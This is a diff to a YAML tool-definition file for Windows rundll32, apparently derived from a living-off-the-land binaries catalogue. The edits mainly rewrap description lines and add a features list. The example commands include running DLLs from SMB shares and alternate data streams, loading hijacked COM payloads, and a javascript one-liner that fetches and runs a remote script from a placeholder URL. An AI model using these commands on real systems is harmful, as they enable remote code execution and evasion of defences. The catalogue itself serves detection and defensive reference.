@@ -2,7 +2,8 @@
 id: windows-execution-rundll32
 namespace: windows:execution:rundll32
 name: rundll32
-description: 'Used by Windows to execute dll files Located at: C:\Windows\System32\rundll32.exe; C:\Windows\SysWOW64\rundll32.exe.'
+description: 'Used by Windows to execute dll files Located at: C:\Windows\System32\rundll32.exe;
+  C:\Windows\SysWOW64\rundll32.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -43,7 +44,13 @@ resource_profile:
 allowed-tools:
 - rundll32
 parameters: []
-features: []
+features:
+- file-system
+- local
+- pipes-stdin
+- pipes-stdout
+- process-manip
+- streaming
 execution:
   template: rundll32
   sandbox: execFile
@@ -51,15 +58,22 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute. (Execute DLL file)
+- description: First part should be a DLL file (any extension accepted), EntryPoint
+    should be the name of the entry point in the DLL file to execute. (Execute DLL
+    file)
   command: rundll32.exe {PATH},EntryPoint
-- description: Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute. (Execute DLL from SMB share.)
+- description: Execute a DLL from an SMB share. EntryPoint is the name of the entry
+    point in the DLL file to execute. (Execute DLL from SMB share.)
   command: rundll32.exe {PATH_SMB:.dll},EntryPoint
-- description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script. (Execute code from Internet)
+- description: Use Rundll32.exe to execute a JavaScript script that calls a remote
+    JavaScript script. (Execute code from Internet)
   command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
-- description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS). (Execute code from alternate data stream)
+- description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data
+    Stream (ADS). (Execute code from alternate data stream)
   command: rundll32 "{PATH}:ADSDLL.dll",DllMain
-- description: Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID. (Execute a DLL/EXE COM server payload or ScriptletURL code.)
+- description: Use Rundll32.exe to load a registered or hijacked COM Server payload.
+    Also works with ProgID. (Execute a DLL/EXE COM server payload or ScriptletURL
+    code.)
   command: rundll32.exe -sta {CLSID}
 references:
 - label: ''
@@ -103,7 +117,6 @@ install:
   commands:
   - choco install rundll32
 ---
-
 
 # rundll32
 
